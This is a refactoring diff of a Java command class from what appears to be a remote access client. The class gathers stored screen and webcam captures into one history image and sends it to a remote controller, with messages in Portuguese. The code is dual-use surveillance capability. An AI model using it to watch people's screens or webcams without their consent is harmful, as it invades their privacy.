@@ -6,7 +6,7 @@ package br.com.introcdc.connect.client.commands.image;
 import br.com.introcdc.connect.Connect;
 import br.com.introcdc.connect.client.ConnectClient;
 import br.com.introcdc.connect.client.command.ClientCommand;
-import br.com.introcdc.connect.client.components.ImageComponents;
+import br.com.introcdc.connect.client.components.ClientImageComponents;
 
 import java.awt.image.BufferedImage;
 import java.util.ArrayList;
@@ -20,15 +20,15 @@ public class ClientCommandHistory extends ClientCommand {
     @Override
     public void execute(String command, String input) throws Exception {
         if (input.equalsIgnoreCase("screen") || input.equalsIgnoreCase("webcam")) {
-            java.util.List<BufferedImage> history = new ArrayList<>(input.equalsIgnoreCase("screen") ? ImageComponents.SCREEN_HISTORY : ImageComponents.WEBCAM_HISTORY);
+            java.util.List<BufferedImage> history = new ArrayList<>(input.equalsIgnoreCase("screen") ? ClientImageComponents.SCREEN_HISTORY : ClientImageComponents.WEBCAM_HISTORY);
             if (history.isEmpty()) {
                 msg("O histórico de " + (input.equalsIgnoreCase("screen") ? "tela" : "webcam") + " está vazio!");
                 return;
             }
             try {
-                BufferedImage image = ImageComponents.createHistoryImage(history);
+                BufferedImage image = ClientImageComponents.createHistoryImage(history);
                 msg("view-image");
-                ConnectClient.EXECUTOR.schedule(() -> ImageComponents.sendImage(5, image), Connect.DELAY, Connect.DELAY_TYPE);
+                ConnectClient.EXECUTOR.schedule(ConnectClient.runnable(() -> ClientImageComponents.sendImage(5, image)), Connect.DELAY, Connect.DELAY_TYPE);
             } catch (Exception exception) {
                 msg("Ocorreu um erro ao enviar a imagem do histórico da " + (input.equalsIgnoreCase("screen") ? "tela" : "webcam") + "! (" + exception.getMessage() + ")");
                 exception(exception);
